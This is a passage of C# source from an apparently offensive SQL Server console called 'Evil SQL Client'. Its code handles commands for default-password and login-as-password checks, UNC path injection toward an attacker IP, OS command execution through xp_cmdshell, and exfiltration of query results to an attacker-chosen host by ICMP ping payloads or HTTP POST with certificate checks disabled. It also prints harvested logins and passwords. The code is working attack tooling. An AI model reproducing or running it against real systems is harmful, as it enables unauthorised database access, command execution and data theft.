                        foreach (DataRow CurrentRecord in distinctValues.Select())
                        {

                            // Display SQL Server information
                            Console.WriteLine("\nInstance             : " + CurrentRecord["Instance"].ToString());
                            Console.WriteLine("Domain               : " + CurrentRecord["DomainName"].ToString());
                            Console.WriteLine("Service PID          : " + CurrentRecord["ServiceProcessID"].ToString());
                            Console.WriteLine("Service Name         : " + CurrentRecord["ServiceName"].ToString());
                            Console.WriteLine("Service Account      : " + CurrentRecord["ServiceAccount"].ToString());
                            Console.WriteLine("Authentication Mode  : " + CurrentRecord["AuthenticationMode"].ToString());
                            Console.WriteLine("Forced Encryption    : " + CurrentRecord["ForcedEncryption"].ToString());
                            Console.WriteLine("Clustered            : " + CurrentRecord["Clustered"].ToString());
                            Console.WriteLine("SQL Version          : " + CurrentRecord["SQLServerMajorVersion"].ToString());
                            Console.WriteLine("SQL Version Number   : " + CurrentRecord["SQLServerVersionNumber"].ToString());
                            Console.WriteLine("SQL Edition          : " + CurrentRecord["SQLServerEdition"].ToString());
                            Console.WriteLine("SQL Service Pack     : " + CurrentRecord["SQLServerServicePack"].ToString());
                            Console.WriteLine("OS Architecture      : " + CurrentRecord["OSArchitecture"].ToString());
                            Console.WriteLine("OS Version Number    : " + CurrentRecord["OsVersionNumber"].ToString());
                            Console.WriteLine("Login                : " + CurrentRecord["CurrentLogin"].ToString());
                            Console.WriteLine("Password             : " + CurrentRecord["CurrentLoginPassword"].ToString());
                            Console.WriteLine("Login is Sysadmin    : " + CurrentRecord["IsSysadmin"].ToString());
                        }

                        // Display count
                        int accessCount = distinctValues.Rows.Count;
                        Console.Write("\n" + accessCount + " instances can be logged into.\n");

                        // Display console
                        Console.Write("\nSQLCLIENT> ");
                    }

                    // EXPORT SQL SERVER INSTANCES THAT CAN BE LOGGED INTO TO FILE
                    bool exportaccessCheck = MyQuery.ToLower().Contains("export access");
                    if (exportaccessCheck)
                    {
                        // Parse file path
                        String filePath1 = MyQuery.ToLower();
                        String targetPath = filePath1.Split(' ')[2];

                        StringBuilder fileContent = new StringBuilder();

                        foreach (var col in SQLCommands.MasterAccessList.Columns)
                        {
                            fileContent.Append(col.ToString() + ",");
                        }

                        fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
                        foreach (DataRow dr in SQLCommands.MasterAccessList.Rows)
                        {
                            foreach (var column in dr.ItemArray)
                            {
                                fileContent.Append("\"" + column.ToString() + "\",");
                            }

                            fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
                        }

                        try
                        {
                            // write file output
                            System.IO.File.WriteAllText(targetPath, fileContent.ToString());
                            Console.WriteLine("\n" + SQLCommands.MasterAccessList.Rows.Count + " instances were written to " + targetPath);
                        }
                        catch
                        {
                            Console.WriteLine("\nUnable to write file.\n");
                        }

                        // Display console	
                        Console.Write("\nSQLCLIENT> ");
                    }

                    // CLEAR DISCOVERED INSTANCES 
                    bool clearaccessCheck = MyQuery.ToLower().Contains("clear access");
                    if (clearaccessCheck)
                    {
                        // Remove items
                        SQLCommands.MasterAccessList.Clear();

                        // Status user
                        Console.Write("\nThe list of instances that can be logged into has been cleared.\n");

                        // Display console				
                        Console.Write("\nSQLCLIENT> ");
                    }

                    #endregion

                    // ----------------------------------------------------
                    // DATA EXFILTRATION SETTINGS 
                    // ----------------------------------------------------
                    #region data exfiltration settings 

                    // FILE EXFILTRATION: ENABLE/DISABLE
                    bool fileCheck3 = MyQuery.ToLower().Contains("set file ");
                    if (fileCheck3)
                    {
                        string filestate = MyQuery.Replace("set file ", "");
                        if ((filestate.Equals("enabled")) || (filestate.Equals("disabled")))
                        {
                            ExportFileStateG = filestate;
                            Console.Write("\nExfiltrating query results to a file has been " + filestate + ".\n");
                            Console.Write("Don't forget to set the filepath setting.\n");
                        }
                        else
                        {
                            Console.Write("\nValid settings include enabled or disabled.\n");
                        }
                        Console.Write("\nSQLCLIENT> ");
                    }

                    // FILE EXFILTRATION: SET OUTPUT FILE
                    bool fileCheck = MyQuery.ToLower().Contains("set filepath ");
                    if (fileCheck)
                    {
                        string newfile = MyQuery.ToLower().Replace("set filepath ", "");
                        Console.Write("\nQuery results will be exported to " + newfile + ".\n");
                        ExportFilePathG = newfile;
                        Console.Write("\nSQLCLIENT> ");
                    }

                    // ICMP EXFILTRATION: ENABLE/DISABLE
                    bool icmpenabledCheck = MyQuery.ToLower().Contains("set icmp ");
                    if (icmpenabledCheck)
                    {
                        string IcmpState = MyQuery.ToLower().Replace("set icmp ", "");
                        if ((IcmpState.Equals("enabled")) || (IcmpState.Equals("disabled")))
                        {
                            IcmpStateG = IcmpState;
                            Console.Write("\nExfiltrating query results via ICMP has been " + IcmpState + ".\n");
                            Console.Write("Don't forget to configure the ICMPIP setting.\n");
                        }
                        else
                        {
                            Console.Write("\nValid settings include enabled or disabled.\n");
                        }
                        Console.Write("\nSQLCLIENT> ");
                    }

                    // ICMP EXFILTRATION: SET IP
                    bool ipCheck = MyQuery.ToLower().Contains("set icmpip ");
                    if (ipCheck)
                    {
                        string targetip = MyQuery.ToLower().Replace("set icmpip ", "");
                        IcmpIpG = targetip;
                        Console.Write("\nICMP IP set to " + targetip + ".\n");
                        Console.Write("\nSQLCLIENT> ");
                    }

                    // HTTP EXFILTRATION: ENABLE/DISABLE
                    bool httpenabledCheck = MyQuery.ToLower().Contains("set http ");
                    if (httpenabledCheck)
                    {
                        string HttpState = MyQuery.ToLower().Replace("set http ", "");
                        if ((HttpState.Equals("enabled")) || (HttpState.Equals("disabled")))
                        {
                            HttpStateG = HttpState;
                            Console.Write("\nExfiltrating query results via HTTP POST has been " + HttpState + ".\n");
                            Console.Write("Don't forget to set the HTTPURL setting.\n");
                        }
                        else
                        {
                            Console.Write("\nValid settings include enabled or disabled.\n");
                        }
                        Console.Write("\nSQLCLIENT> ");
                    }

                    // HTTP EXFILTRATION: SET URL
                    bool urlCheck = MyQuery.ToLower().Contains("set httpurl ");
                    if (urlCheck)
                    {
                        string targeturl = MyQuery.ToLower().Replace("set httpurl ", "");
                        HttpUrlG = targeturl;
                        Console.Write("\nHTTP URL set to " + targeturl + ".\n");
                        Console.Write("\nSQLCLIENT> ");
                    }

                    #endregion

                    // ----------------------------------------------------
                    // DATA ENCRYPTION SETTINGS 
                    // ----------------------------------------------------
                    #region data encryption settings 

                    // DATA ENCRYPTION: ENABLE/DISABLE
                    bool encdisabledCheck = MyQuery.ToLower().Contains("set encryption ");
                    if (encdisabledCheck)
                    {
                        string encstate = MyQuery.Replace("set encryption ", "");
                        if ((encstate.Equals("enabled")) || (encstate.Equals("disabled")))
                        {
                            EncStateG = encstate;
                            Console.Write("\nData encryption has been " + encstate + ".\n");
                            Console.Write("Don't forget update the key and salt.\n");
                        }
                        else
                        {
                            Console.Write("\nValid settings include enabled or disabled.\n");
                        }
                        Console.Write("\nSQLCLIENT> ");
                    }

                    // DATA ENCRYPTION: SET KEY
                    bool keyCheck = MyQuery.ToLower().Contains("set enckey ");
                    if (keyCheck)
                    {
                        string mykey = MyQuery.Replace("set enckey ", "");
                        EncKeyG = mykey;
                        Console.Write("\nEncryption key set to: " + mykey + "\n");
                        Console.Write("\nSQLCLIENT> ");
                    }

                    // DATA ENCRYPTION: SET SALT
                    bool saltCheck = MyQuery.ToLower().Contains("set encsalt ");
                    if (saltCheck)
                    {
                        string mysalt = MyQuery.Replace("set encsalt ", "");
                        EncSaltG = mysalt;
                        Console.Write("\nEncryption salt set to: " + mysalt + "\n");
                        Console.Write("\nSQLCLIENT> ");
                    }

                    #endregion

                    // ----------------------------------------------------
                    // OFFENSIVE COMMANDS 
                    // ----------------------------------------------------
                    #region offensive commands 

                    // CHECK ACCESS 
                    bool CheckAccessBool = MyQuery.ToLower().Contains("check access");
                    if (CheckAccessBool)
                    {
                        CheckAccess();
                        Console.Write("\nSQLCLIENT> ");
                    }

                    // CHECK DEFAULT PW
                    // Applications instances configure with application specific defaults 
                    bool CheckDefaultPwBool = MyQuery.ToLower().Contains("check defaultpw");
                    if (CheckDefaultPwBool)
                    {
                        CheckDefaultAppPw();
                        Console.Write("\nSQLCLIENT> ");
                    }

                    // LIST DATABASES
                    bool CheckListDb = MyQuery.ToLower().Contains("list databases");
                    if (CheckListDb)
                    {
                        ListDatabase();
                        Console.Write("\nSQLCLIENT> ");
                    }

                    // LIST TABLES
                    bool CheckListTbl = MyQuery.ToLower().Contains("list tables");
                    if (CheckListTbl)
                    {
                        ListTable();
                        Console.Write("\nSQLCLIENT> ");
                    }

                    // LIST SERVER INFORMATION
                    bool CheckListServerInfo = MyQuery.ToLower().Contains("list serverinfo");
                    if (CheckListServerInfo)
                    {
                        ListServerInfo();
                        Console.Write("\nSQLCLIENT> ");
                    }

                    // LIST ROLE MEMBERS
                    bool CheckRoleMember = MyQuery.ToLower().Contains("list rolemembers");
                    if (CheckRoleMember)
                    {
                        ListRoleMembers();
                        Console.Write("\nSQLCLIENT> ");
                    }

                    // LIST LINKS
                    bool CheckListLink = MyQuery.ToLower().Contains("list links");
                    if (CheckListLink)
                    {
                        ListLinks();
                        Console.Write("\nSQLCLIENT> ");
                    }

                    // LIST LOGINS
                    bool CheckListLogin = MyQuery.ToLower().Contains("list logins");
                    if (CheckListLogin)
                    {
                        ListLogins();
                        Console.Write("\nSQLCLIENT> ");
                    }

                    // LIST PRIVS
                    bool CheckListPrivs = MyQuery.ToLower().Contains("list privs");
                    if (CheckListPrivs)
                    {
                        ListPrivs();
                        Console.Write("\nSQLCLIENT> ");
                    }

                    // LIST LOGIN AS PASSWORD
                    bool CheckLoginAsPwBool = MyQuery.ToLower().Contains("check loginaspw");
                    if (CheckLoginAsPwBool)
                    {
                        CheckLoginAsPw();
                        Console.Write("\nSQLCLIENT> ");
                    }

                    // CHECK UNC PATH INJECTION
                    bool CheckUnc = MyQuery.ToLower().Contains("check uncinject ");
                    if (CheckUnc)
                    {
                        string attackerip = MyQuery.Replace("check uncinject ", "");
                        CheckUncPathInjection(attackerip);
                        Console.Write("\nSQLCLIENT> ");
                    }

                    // RUN OSCMD via xp_cmdshell
                    bool CheckOSCmd = MyQuery.ToLower().Contains("run oscmd ");
                    if (CheckOSCmd)
                    {
                        string command = MyQuery.Replace("run oscmd ", "");
                        RUNOSCMD(command);
                        Console.Write("\nSQLCLIENT> ");
                    }

                    #endregion

                    // ----------------------------------------------------
                    // MISC COMMANDS 
                    // ----------------------------------------------------
                    #region misc commands 

                    // VERBOSE: ENABLE/DISABLE
                    bool verboseCheck = MyQuery.ToLower().Contains("set verbose ");
                    if (verboseCheck)
                    {
                        string VerboseState = MyQuery.ToLower().Replace("set verbose ", "");
                        if ((VerboseState.Equals("enabled")) || (VerboseState.Equals("disabled")))
                        {
                            VerboseG = VerboseState;
                            Console.Write("\nVerbose errors messages have been " + VerboseState + ".\n");
                        }
                        else
                        {
                            Console.Write("\nValid settings include enabled or disabled.\n");
                        }
                        Console.Write("\nSQLCLIENT> ");
                    }

                    // CLEAR CONSOLE
                    if (MyQuery.ToLower().Equals("clear"))
                    {
                        Console.Clear();
                        fullcommand = "";
                        Console.WriteLine("----------");
                        Console.Write("SQLCLIENT> ");
                    }

                    // SHOW SETTINGS 
                    bool statusCheck = MyQuery.ToLower().Contains("show settings");
                    if (statusCheck)
                    {
                        fullcommand = "";
                        Console.WriteLine("\n------------------------------------");
                        Console.WriteLine("    Evil SQL Client (ESC) v1.0");
                        Console.WriteLine("------------------------------------");
                        Console.WriteLine("       CONNECTION SETTINGS   ");
                        Console.WriteLine("------------------------------------");
                        Console.WriteLine(" ConnString : " + ConnectionStringG);
                        Console.WriteLine(" TargetAll  : " + InstanceAllG);
                        Console.WriteLine(" Instance   : " + InstanceG);
                        Console.WriteLine(" Username   : " + UsernameG);
                        Console.WriteLine(" Password   : " + PasswordG);
                        Console.WriteLine(" UserType   : " + UsertypeG);
                        Console.WriteLine(" Timeout    : " + TimeOutG);
                        Console.WriteLine(" Verbose    : " + VerboseG);

                        Console.WriteLine("\n------------------------------------");
                        Console.WriteLine("    DATA EXFILTRATION SETTINGS      ");
                        Console.WriteLine("------------------------------------");
                        Console.WriteLine(" FILE	   : " + ExportFileStateG);
                        Console.WriteLine(" FILEPATH   : " + ExportFilePathG);
                        Console.WriteLine(" ICMP       : " + IcmpStateG);
                        Console.WriteLine(" ICMPIP     : " + IcmpIpG);
                        Console.WriteLine(" HTTP       : " + HttpStateG);
                        Console.WriteLine(" HTTPURL    : " + HttpUrlG);
                        Console.WriteLine(" Encryption : " + EncStateG);
                        Console.WriteLine(" EncKey     : " + EncKeyG);
                        Console.WriteLine(" EncSalt    : " + EncSaltG);
                        Console.WriteLine("------------------------------------\n");
                        Console.Write("SQLCLIENT> ");
                    }

                    // SHOW HELP
                    bool helpCheck = MyQuery.ToLower().Contains("help");
                    if (MyQuery.ToLower().Equals("help") || MyQuery.ToLower().Equals("show help"))
                    {

                        GetHelp();
                        fullcommand = "";
                        Console.WriteLine("----------");
                        Console.Write("SQLCLIENT> ");
                    }

                    #endregion

                    // Show multi-line input											
                    if ((MyQuery.ToLower() != "clear") && (!CheckOSCmd) && (!CheckUnc) && (!CheckListServerInfo) && (!CheckRoleMember) && (!CheckListPrivs) && (!CheckLoginAsPwBool) && (!CheckListLogin) && (!CheckListLink) && (!CheckListTbl) && (!CheckListDb) && (!CheckDefaultPwBool) && (!clearaccessCheck) && (!exportaccessCheck) && (!showaccessCheck) && (!verboseCheck) && (!timeoutCheck) && (!CheckAccessBool) && (!passwordCheck) && (!fileCheck3) && (!cleardiscoCheck) && (!usernameCheck) && (!exportdiscoCheck) && (!instanceCheck) && (!instanceallCheck) && (!showdiscoCheck) && (!broadcastCheck) && (!fileCheck1) && (!spnCheck) && (!encdisabledCheck) && (!urlCheck) && (!keyCheck) && (!saltCheck) && (!ipCheck) && (!loadCheck) && (!fileCheck) && (!helpCheck) && (!httpenabledCheck) && (!icmpenabledCheck) && (!statusCheck))
                    {
                        Console.Write("         > ");
                    }

                    // Collect additional query lines						
                    MyQuery = Console.ReadLine().ToString();
                }

                // ------------------------------------------------------------
                //  PERFORM QUERY 
                // ------------------------------------------------------------
                CheckQueryReady();
                if (ReadyforQueryG.Equals("yes"))
                {
                    // Create data table 
                    IList<string> TargetList = new List<string>();

                    // Add all
                    if (InstanceAllG.Equals("enabled"))
                    {
                        // Add all
                        // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/									   
                        if (InstanceAllG.Equals("enabled"))
                        {
                            foreach (DataRow CurrentRecord in SQLCommands.MasterAccessList.Select())
                            {
                                TargetList.Add(CurrentRecord["Instance"].ToString());
                            }
                        }
                    }

                    // Add instance
                    if (!InstanceG.Equals(""))
                    {
                        TargetList.Add(InstanceG);
                    }

                    // Get list count
                    var count = TargetList.Count;
                    Console.WriteLine("\n" + count + " instances will be targeted.\n");

                    // Loop through target list 
                    foreach (var instance in TargetList)
                    {
                        Console.WriteLine("\n" + instance + ": ATTEMPTING QUERY");
                        try
                        {

                            // ----------------------------
                            // Setup connection string
                            // ----------------------------
                            string ConnectionString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");

                            // ----------------------------
                            // Execute query	
                            // ----------------------------							
                            SqlConnection conn = new SqlConnection(ConnectionString);
                            SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
                            conn.Open();

                            // Execute query and read data into data table
                            DataTable dt = new DataTable();
                            SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
                            da.Fill(dt);

                            // Display results 	
                            DataRow[] currentRows = dt.Select(null, null, DataViewRowState.CurrentRows);
                            if (currentRows.Length < 1)
                            {
                                Console.WriteLine("\nNo rows returned.\n");
                            }
                            else
                            {
                                Console.WriteLine("\nQUERY RESULTS:\n");

                                foreach (DataColumn column in dt.Columns)
                                {
                                    Console.Write("\t{0}", column.ColumnName);
                                }

                                Console.WriteLine("\t");

                                foreach (DataRow row in currentRows)
                                {
                                    foreach (DataColumn column in dt.Columns)
                                    {
                                        Console.Write("\t{0}", row[column]);
                                    }

                                    Console.WriteLine("\t");
                                }
                                Console.WriteLine("\t");
                            }

                            // ----------------------------
                            // Encrypt data
                            // ----------------------------
                            if (EncStateG.Equals("enabled"))
                            {
                                Console.WriteLine("\nEncrypting data.");
                                // encrypt exfil encryption
                                //string enableEncryption = "false";
                                //string mySharedSecret = "changethis";
                                //string encrypted64 = EncryptStringAES(fileContent.ToString(), EncKeyG);	
                            }

                            // ----------------------------
                            // Exfiltrate data to file
                            // ----------------------------
                            if (ExportFileStateG.Equals("enabled"))
                            {
                                StringBuilder fileContent = new StringBuilder();

                                foreach (var col in dt.Columns)
                                {
                                    fileContent.Append(col.ToString() + ",");
                                }

                                fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
                                foreach (DataRow dr in dt.Rows)
                                {
                                    foreach (var column in dr.ItemArray)
                                    {
                                        fileContent.Append("\"" + column.ToString() + "\",");
                                    }

                                    fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
                                }

                                try
                                {
                                    // write file output
                                    System.IO.File.AppendAllText(ExportFilePathG, fileContent.ToString());
                                    Console.WriteLine("\nSuccessfully wrote file to " + ExportFilePathG + "\n");
                                }
                                catch
                                {
                                    Console.WriteLine("\nUnable to write file.\n");
                                }
                            }

                            // ----------------------------
                            // Exfiltrate data to icmp
                            // ----------------------------
                            if (IcmpStateG.Equals("enabled"))
                            {
                                Console.WriteLine("Exfiltrating results via ICMP to: " + IcmpIpG + "\n");

                                // Create content to send
                                StringBuilder fileContent = new StringBuilder();

                                foreach (var col in dt.Columns)
                                {
                                    fileContent.Append(col.ToString() + ",");
                                }

                                fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
                                foreach (DataRow dr in dt.Rows)
                                {
                                    foreach (var column in dr.ItemArray)
                                    {
                                        fileContent.Append("\"" + column.ToString() + "\",");
                                    }

                                    fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
                                }


                                // Create string to be sent in ICMP payload
                                string data = fileContent.ToString();

                                // Source: https://docs.microsoft.com/en-us/dotnet/api/system.net.networkinformation.ping?view=netframework-4.7.2
                                Ping pingSender = new Ping();
                                PingOptions options = new PingOptions();

                                // Use the default Ttl value which is 128, but change the fragmentation behavior.
                                int timeout = 120;
                                options.DontFragment = true;

                                // Create a buffer of data to be transmitted.
                                byte[] buffer = Encoding.ASCII.GetBytes(data);
                                PingReply reply = pingSender.Send(IcmpIpG, timeout, buffer, options);
                                Console.WriteLine("ICMP exfiltration is complete.\n");
                            }

                            // ----------------------------
                            // Exfiltrate data to http post
                            // ----------------------------
                            if (HttpStateG.Equals("enabled"))
                            {
                                Console.WriteLine("Exfiltrating results to URL: " + HttpUrlG + "\n");

                                // Create content to send
                                StringBuilder fileContent = new StringBuilder();

                                foreach (var col in dt.Columns)
                                {
                                    fileContent.Append(col.ToString() + ",");
                                }

                                fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
                                foreach (DataRow dr in dt.Rows)
                                {
                                    foreach (var column in dr.ItemArray)
                                    {
                                        fileContent.Append("\"" + column.ToString() + "\",");
                                    }

                                    fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
                                }

                                // Create string to be sent in ICMP payload
                                string mydata = fileContent.ToString();
                                byte[] postArray1 = Encoding.ASCII.GetBytes(mydata);

                                try
                                {
                                    // Trust all SSL certs
                                    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };

                                    // Turn on TLS 1.1 and 1.2 without affecting other protocols:
                                    ServicePointManager.SecurityProtocol |= SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;

                                    // Create webclient and send payload 																							
                                    WebClient myWebClient1 = new WebClient();
                                    myWebClient1.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                                    byte[] responseArray1 = myWebClient1.UploadData(HttpUrlG, "POST", postArray1);
                                    //Console.WriteLine("\nResponse received was :{0}", Encoding.ASCII.GetString(responseArray1));		
                                }
                                catch
                                {
                                    // catch(System.Net.WebException ex1)
                                    // Console.WriteLine("HTTP POST FAILED: " + ex1.Message + "\n");									
                                }

                                Console.WriteLine("Exfiltration complete.\n");
                            }

                        }
                        catch (SqlException ex)
                        {
                            Console.WriteLine(instance + ": CONNECTION OR QUERY FAILED");
                            if (VerboseG.Equals("enabled"))
                            {
                                Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                            }
                        }
                    }
                }
                else
                {
                    Console.WriteLine("\nNo target instances have been defined.\n");
                }

                // Return to console 
                SQLCommands.RunSQLConsole();
                return null;
            }
        }
    }
}
